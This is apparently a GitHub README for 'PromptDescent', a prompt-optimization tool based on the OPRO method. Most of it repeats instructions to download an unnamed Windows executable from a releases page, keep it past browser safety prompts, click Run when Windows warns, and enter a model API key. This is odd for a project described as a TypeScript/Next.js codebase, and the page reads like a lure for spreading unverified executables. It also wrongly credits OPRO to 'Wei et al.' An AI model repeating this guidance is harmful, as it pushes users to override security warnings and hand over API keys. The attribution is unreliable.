# 🧠 PromptDescent - Optimize prompts with less trial and error

[![Download PromptDescent](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jeronimovv/PromptDescent/releases)

## 📥 Download

Visit the [releases page](https://github.com/jeronimovv/PromptDescent/releases) to download PromptDescent for Windows.

1. Open the release page.
2. Find the latest release at the top.
3. Download the Windows file from the list of assets.
4. Save the file to your computer.
5. Open the file to start the app.

If your browser shows a safety prompt, choose the option to keep the file after you confirm it came from the release page.

## 🖥️ What PromptDescent Does

PromptDescent helps you improve prompts by testing many versions and keeping the ones that work best. It uses a method from the OPRO paper by Wei et al. that treats prompt writing as a search problem.

It is built for people who want to:

- improve prompt quality
- compare prompt versions
- use a research-based method instead of hand tuning
- work with language models as the optimizer
- run prompt experiments without prompt libraries

## ⚙️ System Requirements

PromptDescent runs on a modern Windows PC with:

- Windows 10 or Windows 11
- 8 GB of RAM or more
- a recent Intel or AMD processor
- an internet connection for model access and release download
- enough free space for the app and local files

If you plan to run larger prompt tests, use a machine with more memory and a stable network connection.

## 🚀 Getting Started

1. Open the [releases page](https://github.com/jeronimovv/PromptDescent/releases).
2. Download the Windows release file.
3. When the download finishes, open the file.
4. If Windows asks for permission, choose **Yes** or **Run**.
5. Follow the setup steps on screen.
6. Start PromptDescent from the app window or the shortcut it creates.

If the app opens in a browser window, keep that window open while you use it.

## 🧭 First Run

When PromptDescent starts for the first time, it may ask you to set a few basic options:

- your model provider
- your API key
- the prompt you want to improve
- the task you want the prompt to solve

Enter the details one step at a time. If you are not sure what to type, start with a simple prompt and a small test task.

## 🔧 How It Works

PromptDescent follows a simple loop:

1. Start with one prompt.
2. Send it to a language model.
3. Score the result with a test function.
4. Ask the model to suggest a better prompt.
5. Repeat the process until the score improves.

This matches the idea in OPRO:

- the prompt is the thing you want to improve
- the score comes from your task
- the optimizer is another language model
- the system searches over natural language, not numbers

## 📋 Typical Use Cases

PromptDescent fits tasks like:

- prompt tuning for chat tools
- prompt testing for QA flows
- research demos for OPRO
- prompt search for finance-related workflows
- comparison of model outputs across prompt versions
- quick experiments for instruction writing

## 🪄 Basic Workflow

### 1. Choose a task
Pick a task that has a clear result, such as classification, extraction, or ranking.

### 2. Add a starting prompt
Use the prompt you already have, even if it is rough.

### 3. Set a score
Define what a good answer looks like. This can be a match score, accuracy score, or custom rule.

### 4. Run optimization
PromptDescent creates new prompt versions and tests them.

### 5. Review the best result
Keep the prompt that gives the best score on your test set.

## 🔍 What You Will See

During a run, PromptDescent may show:

- the current prompt
- the prompt suggested by the model
- the score for each attempt
- the best prompt found so far
- a log of each round

This helps you see how the prompt changes over time.

## 🛠️ Troubleshooting

### The file does not open
- Make sure the download finished.
- Check that you downloaded the Windows release from the releases page.
- Try opening the file again.

### Windows blocks the app
- Open the file from your Downloads folder.
- Choose the option to run it if Windows asks for permission.
- Confirm that you downloaded it from the release page.

### The app opens but does not load
- Check your internet connection.
- Confirm your model settings.
- Make sure your API key is valid.

### The results look weak
- Use a clearer test task.
- Start with a better base prompt.
- Give the optimizer more rounds.
- Check that your score matches the task you want to improve.

## 📚 About the Project

PromptDescent is a production implementation of OPRO from Wei et al., 2023. It uses a gradient-free method for prompt optimization and works in discrete natural language space.

It is built from the paper and does not rely on prompt libraries. The codebase uses modern web tooling and TypeScript, which helps keep the app easy to extend and test.

## 🧪 Research Notes

The project is useful when you want to explore:

- prompt search methods
- LLM-as-optimizer setups
- natural language optimization
- structured prompt evaluation
- reproducible prompt experiments

It can help with both product work and research work when prompt quality matters.

## 🧩 Project Topics

- anthropic
- gradient-free-optimization
- llm
- machine-learning
- nextjs
- opro
- prompt-optimization
- quantitative-finance
- research-implementation
- typescript

## 📁 Files and Folders

A typical install may include:

- the main app
- config files
- prompt templates
- run logs
- output results
- local cache files

Keep the app folder in a stable place so it is easy to find later.

## 🔒 API Keys

PromptDescent may need access to a language model provider. If so, you will need to add an API key in the app settings.

Use the key from your model provider account and keep it private. Do not share it with other people.

## 🧼 Keeping Your Setup Clean

To remove the app:

1. Close PromptDescent.
2. Delete the app folder or uninstall it if the release provides an uninstaller.
3. Remove any local config files if you no longer need them.
4. Clear old outputs if you want to free space.

## 🖱️ Download Again Later

If you need a fresh copy, use the [release page](https://github.com/jeronimovv/PromptDescent/releases) again and download the newest Windows build.

## 🧠 Best Practices

- start with one small task
- keep the test set simple
- use a clear score
- save the best prompt after each run
- compare runs with the same settings
- test on a few examples before a full run

## 📄 License and Source

PromptDescent is a research-based implementation of OPRO and is hosted on GitHub for release downloads and project updates.